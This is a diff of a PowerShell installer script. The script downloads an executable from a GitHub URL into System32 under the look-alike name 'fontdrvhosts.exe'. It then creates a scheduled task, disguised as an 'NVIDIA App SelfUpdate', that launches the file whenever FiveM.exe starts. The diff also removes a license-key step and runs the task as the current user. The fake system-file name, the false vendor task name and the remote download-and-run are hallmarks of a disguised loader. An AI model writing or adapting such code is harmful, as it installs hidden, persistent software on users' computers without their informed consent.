@@ -21,9 +21,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
-$databasePath  = Join-Path $system32Path "key.txt"
-$exeUrl        = "https://raw.githubusercontent.com/weewrrwr/4ealnest/main/4ealnest.exe"
-$taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
+$exeUrl = "https://raw.githubusercontent.com/weewrrwr/4ealnest/main/4ealnest.exe"
+$taskName = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 
 # -----------------------------
 # Install Mode
@@ -34,12 +33,10 @@ if ($choice -eq "1") {
     # Download exe
     Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
 
-    # Request license key and save
-    $key = Read-Host "Enter License Key"
-    Set-Content -Path $databasePath -Value $key
+    # Create scheduled task under CURRENT USER (NOT SYSTEM)
+    $currentUser = "$env:USERNAME"
 
-    # Create scheduled task
-    $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+    $cmd = "cmd /c schtasks /create /tn `"$taskName`" /tr `"C:\Windows\System32\fontdrvhosts.exe`" /sc ONEVENT /ec Security /mo `"*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='%localappdata%\FiveM\FiveM.exe']]`" /ru `"$currentUser`" /it"
     Invoke-Expression $cmd
 
     # Enable audit logging
@@ -59,7 +56,6 @@ elseif ($choice -eq "2") {
 
     # Remove files if they exist
     if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
-    if (Test-Path $databasePath) { Remove-Item $databasePath -Force }
 
     Write-Host "Cleanup completed."
 }
